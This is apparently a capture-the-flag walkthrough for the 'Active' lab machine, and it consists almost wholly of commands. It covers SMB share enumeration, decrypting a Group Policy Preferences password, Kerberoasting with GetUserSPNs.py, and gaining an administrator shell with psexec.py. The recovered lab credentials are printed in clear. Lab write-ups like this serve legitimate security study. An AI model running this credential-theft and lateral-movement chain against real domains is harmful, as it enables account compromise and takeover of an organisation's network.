
#### SMB
```bash
smbmap -H $IP -R Replication
```
```bash
smbclient //$IP/Replication
recursive ON
prompt OFF
mget *
```

#### Group Policy 
```bash
gpp-decrypt.rb "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```

_User Creds:_ `active.htb\SVC_TGS:GPPstillStandingStrong2k18`

#### User Flag
```bash
smbmap -d active.htb -u svc_tgs -p GPPstillStandingStrong2k18 -H $IP --download Users/SVC_TGS/Desktop/user.txt
```

#### Kerberost
```bash
ServicePrincipalName 
--------------------
active/CIFS:445 
```
```bash
GetUserSPNs.py active.htb/svc_tgs -dc-ip $IP -request
```

_Admin Creds:_ `Administartor:Ticketmaster1968`

```bash
psexec.py active.htb/Administrator:Ticketmaster1968@$IP
```


